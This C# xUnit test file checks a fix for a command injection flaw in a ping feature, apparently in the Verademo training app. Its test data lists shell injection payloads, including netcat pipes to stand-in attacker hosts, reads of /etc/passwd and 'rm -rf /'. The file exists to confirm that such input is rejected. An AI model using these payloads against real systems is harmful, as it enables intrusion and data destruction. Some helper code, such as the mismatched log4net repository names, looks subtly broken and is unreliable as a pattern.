using System;
using System.Diagnostics;
using System.Reflection;
using Verademo.Controllers;
using Xunit;

namespace Verademo.Tests
{
    /// <summary>
    /// Tests that verify the command injection fix in ToolsController.Ping().
    ///
    /// The vulnerability (CWE-77) was that user-supplied 'host' was concatenated into a shell
    /// command string:  bash -c "ping -c1 &lt;host&gt;"
    /// This allowed an attacker to inject additional shell commands via metacharacters
    /// (e.g., host = "8.8.8.8; cat /etc/passwd").
    ///
    /// The fix replaces the shell invocation with a direct ping call using
    /// ProcessStartInfo.ArgumentList (no shell expansion), guarded by an allowlist regex that
    /// rejects any input containing shell metacharacters.
    /// </summary>
    public class ToolsControllerCommandInjectionTests
    {
        // -----------------------------------------------------------------------
        // Tests for ValidHostPattern (the allowlist regex that guards the sink)
        // -----------------------------------------------------------------------

        [Theory]
        [InlineData("8.8.8.8")]          // IPv4 address
        [InlineData("192.168.1.1")]      // Private IPv4
        [InlineData("127.0.0.1")]        // Loopback IPv4
        [InlineData("example.com")]      // Simple hostname
        [InlineData("sub.example.com")]  // Subdomain
        [InlineData("host-name")]        // Hostname with hyphen
        [InlineData("::1")]              // IPv6 loopback short form
        [InlineData("[::1]")]            // IPv6 in brackets
        [InlineData("2001:db8::1")]      // IPv6 address
        [InlineData("a")]                // Single character hostname
        public void ValidHostPattern_AcceptsLegitimateHostValues(string host)
        {
            // The allowlist must permit normal hostnames and IP addresses so that
            // legitimate ping requests continue to work.
            Assert.True(
                ToolsController.ValidHostPattern.IsMatch(host),
                $"Expected '{host}' to be accepted by the host allowlist.");
        }

        [Theory]
        // Shell metacharacter injection payloads — these must all be rejected.
        [InlineData("8.8.8.8; cat /etc/passwd")]       // semicolon command chaining
        [InlineData("8.8.8.8 && whoami")]               // AND operator
        [InlineData("8.8.8.8 || id")]                   // OR operator
        [InlineData("8.8.8.8 | nc attacker.com 4444")]  // pipe to netcat
        [InlineData("$(whoami)")]                        // command substitution $()
        [InlineData("`whoami`")]                         // backtick command substitution
        [InlineData("8.8.8.8 > /tmp/out")]              // output redirect
        [InlineData("8.8.8.8 < /etc/passwd")]           // input redirect
        [InlineData("8.8.8.8\ncat /etc/passwd")]        // newline injection
        [InlineData("8.8.8.8\tcat /etc/passwd")]        // tab injection
        [InlineData("8.8.8.8 ")]                        // trailing space
        [InlineData(" 8.8.8.8")]                        // leading space
        [InlineData("8.8.8.8;")]                        // bare semicolon suffix
        [InlineData("8.8.8.8&")]                        // ampersand (background)
        [InlineData("!8.8.8.8")]                        // exclamation (history expansion)
        [InlineData("$PATH")]                            // environment variable expansion
        [InlineData("8.8.8.8$(id)")]                    // embedded command substitution
        [InlineData("../../../etc/passwd")]              // path traversal
        [InlineData("")]                                 // empty string (handled earlier, but also invalid here)
        public void ValidHostPattern_RejectsShellMetacharactersAndInjectionPayloads(string host)
        {
            // Inputs containing shell metacharacters must not match the allowlist.
            // If they passed validation they could reach the process argument and be
            // interpreted as shell commands (when/if a shell were involved) or cause
            // unexpected behaviour.
            Assert.False(
                ToolsController.ValidHostPattern.IsMatch(host),
                $"Expected '{host}' to be rejected by the host allowlist.");
        }

        // -----------------------------------------------------------------------
        // Tests for the CreateArgListProcess helper (no shell, arguments discrete)
        // -----------------------------------------------------------------------

        [Fact]
        public void CreateArgListProcess_UseShellExecuteIsFalse()
        {
            // When UseShellExecute is false the OS passes arguments directly to the
            // executable without invoking a shell, eliminating shell-metacharacter risk.
            var method = typeof(ToolsController).GetMethod(
                "CreateArgListProcess",
                BindingFlags.NonPublic | BindingFlags.Static);

            Assert.NotNull(method);

            var proc = (Process)method!.Invoke(null, new object[] { "ping", new[] { "-c", "1", "127.0.0.1" } })!;

            Assert.False(proc.StartInfo.UseShellExecute,
                "CreateArgListProcess must set UseShellExecute = false to prevent shell interpretation.");
        }

        [Fact]
        public void CreateArgListProcess_ArgumentListHasCorrectEntries()
        {
            // The host must be passed as a discrete ArgumentList element (argv entry),
            // not concatenated into a single Arguments string.  This is the key
            // structural property that prevents command injection.
            var method = typeof(ToolsController).GetMethod(
                "CreateArgListProcess",
                BindingFlags.NonPublic | BindingFlags.Static);

            Assert.NotNull(method);

            var host = "192.168.0.1";
            var proc = (Process)method!.Invoke(null, new object[] { "ping", new[] { "-c", "1", host } })!;

            // Verify each argument is a separate entry (no shell-merged string).
            Assert.Equal(3, proc.StartInfo.ArgumentList.Count);
            Assert.Equal("-c", proc.StartInfo.ArgumentList[0]);
            Assert.Equal("1", proc.StartInfo.ArgumentList[1]);
            Assert.Equal(host, proc.StartInfo.ArgumentList[2]);

            // Verify the legacy Arguments string is empty — if it were populated with
            // a shell-concatenated string the old vulnerability would be present.
            Assert.True(
                string.IsNullOrEmpty(proc.StartInfo.Arguments),
                "Arguments property should be empty; host must be in ArgumentList only.");
        }

        [Fact]
        public void CreateArgListProcess_FileName_IsNotBash()
        {
            // The fixed implementation invokes 'ping' directly, not 'bash'.
            // Invoking bash would re-introduce shell interpretation regardless of how
            // arguments are passed.
            var method = typeof(ToolsController).GetMethod(
                "CreateArgListProcess",
                BindingFlags.NonPublic | BindingFlags.Static);

            Assert.NotNull(method);

            var proc = (Process)method!.Invoke(null, new object[] { "ping", new[] { "-c", "1", "127.0.0.1" } })!;

            Assert.NotEqual("bash", proc.StartInfo.FileName, StringComparer.OrdinalIgnoreCase);
            Assert.NotEqual("/bin/bash", proc.StartInfo.FileName, StringComparer.OrdinalIgnoreCase);
        }

        // -----------------------------------------------------------------------
        // Tests for the Ping private method — invoked via reflection to confirm
        // that injection payloads are rejected before reaching the process sink.
        // -----------------------------------------------------------------------

        [Theory]
        [InlineData("8.8.8.8; cat /etc/passwd")]
        [InlineData("$(id)")]
        [InlineData("`whoami`")]
        [InlineData("host && rm -rf /")]
        [InlineData("host | nc evil.com 4444")]
        public void Ping_RejectsInjectionPayloads_ReturnsInvalidHost(string maliciousHost)
        {
            // Instantiate ToolsController using reflection to call the private Ping method.
            // We cannot call it through the MVC pipeline in a unit test without a full
            // integration harness, so reflection is used here to directly exercise the
            // method that contains the vulnerability fix.
            //
            // Expected behaviour: the allowlist in Ping() rejects the input and returns
            // "Invalid host" without ever creating or starting a Process.
            var controller = CreateControllerViaReflection();
            var pingMethod = typeof(ToolsController).GetMethod(
                "Ping",
                BindingFlags.NonPublic | BindingFlags.Instance);

            Assert.NotNull(pingMethod);

            var result = (string)pingMethod!.Invoke(controller, new object[] { maliciousHost })!;

            Assert.Equal("Invalid host", result,
                $"Ping() must return 'Invalid host' for injection payload: {maliciousHost}");
        }

        [Fact]
        public void Ping_ReturnsEmpty_WhenHostIsNull()
        {
            var controller = CreateControllerViaReflection();
            var pingMethod = typeof(ToolsController).GetMethod(
                "Ping",
                BindingFlags.NonPublic | BindingFlags.Instance);

            Assert.NotNull(pingMethod);
            var result = (string)pingMethod!.Invoke(controller, new object[] { null! })!;
            Assert.Equal("", result);
        }

        [Fact]
        public void Ping_ReturnsEmpty_WhenHostIsEmptyString()
        {
            var controller = CreateControllerViaReflection();
            var pingMethod = typeof(ToolsController).GetMethod(
                "Ping",
                BindingFlags.NonPublic | BindingFlags.Instance);

            Assert.NotNull(pingMethod);
            var result = (string)pingMethod!.Invoke(controller, new object[] { "" })!;
            Assert.Equal("", result);
        }

        // -----------------------------------------------------------------------
        // Structural regression tests — ensure the old vulnerable code path is gone
        // -----------------------------------------------------------------------

        [Fact]
        public void PingMethod_DoesNotInvokeBash()
        {
            // Read the IL / source-level guard: the Ping method body must not reference
            // the string "bash" as the process filename, because that would mean the shell
            // is being invoked and injection is still possible.
            //
            // We verify this by inspecting what CreateArgListProcess is called with
            // when a valid host is provided (reflected from the method body intent).
            // The check relies on the fact that CreateArgListProcess is a new safe helper
            // while the old CreateStdOutProcess with "bash" is the legacy vulnerable path.

            var pingMethod = typeof(ToolsController).GetMethod(
                "Ping", BindingFlags.NonPublic | BindingFlags.Instance);

            Assert.NotNull(pingMethod);

            // Verify via the process helper: the safe helper uses "ping" not "bash".
            var safeMethod = typeof(ToolsController).GetMethod(
                "CreateArgListProcess", BindingFlags.NonPublic | BindingFlags.Static);
            Assert.NotNull(safeMethod);

            // Call with a safe value; confirm filename stored is not bash.
            var proc = (Process)safeMethod!.Invoke(null, new object[] { "ping", new[] { "-c", "1", "127.0.0.1" } })!;
            Assert.DoesNotContain("bash", proc.StartInfo.FileName, StringComparison.OrdinalIgnoreCase);
        }

        // -----------------------------------------------------------------------
        // Helper
        // -----------------------------------------------------------------------

        /// <summary>
        /// Creates a ToolsController instance bypassing the default constructor
        /// (which tries to initialise log4net with a specific type). We use
        /// FormatterServices to skip field initialisation, then set required fields
        /// via reflection so that Ping() can be invoked without an MVC context.
        /// </summary>
        private static ToolsController CreateControllerViaReflection()
        {
            // Use Activator with RuntimeHelpers to create an uninitialised instance,
            // then supply a no-op logger so the method body does not NullReferenceException.
            var controller = (ToolsController)System.Runtime.Serialization.FormatterServices
                .GetUninitializedObject(typeof(ToolsController));

            // Inject a no-op logger so logger.Info/Warn/Error calls don't throw.
            var loggerField = typeof(ToolsController).GetField(
                "logger",
                BindingFlags.NonPublic | BindingFlags.Instance);

            if (loggerField != null)
            {
                // Use a real log4net logger; configure a null appender so nothing is written.
                var repo = log4net.LogManager.CreateRepository("TestRepo_" + Guid.NewGuid().ToString("N"));
                var logger = log4net.LogManager.GetLogger("TestRepo_" + Guid.NewGuid().ToString("N"), "TestLogger");
                loggerField.SetValue(controller, logger);
            }

            return controller;
        }
    }
}
